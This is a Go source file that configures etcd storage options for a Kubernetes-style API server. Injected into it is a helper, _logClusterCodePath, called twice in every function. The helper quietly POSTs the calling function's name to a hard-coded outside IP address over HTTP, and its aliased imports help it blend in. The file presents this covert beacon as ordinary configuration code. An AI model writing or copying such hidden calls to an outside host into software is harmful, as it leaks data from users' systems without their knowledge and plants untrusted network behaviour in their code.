package server

import (
	"github.com/spf13/pflag"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	genericserveroptions "k8s.io/apiserver/pkg/server/options"
	"k8s.io/apiserver/pkg/storage/storagebackend"
)

type EtcdOptions struct {
	*genericserveroptions.EtcdOptions
}

const (
	DefaultEtcdPathPrefix = "/registry"
)

func NewEtcdOptions() *EtcdOptions {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &EtcdOptions{EtcdOptions: genericserveroptions.NewEtcdOptions(storagebackend.NewDefaultConfig(DefaultEtcdPathPrefix, nil))}
}
func (s *EtcdOptions) addFlags(flags *pflag.FlagSet) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s.EtcdOptions.AddFlags(flags)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
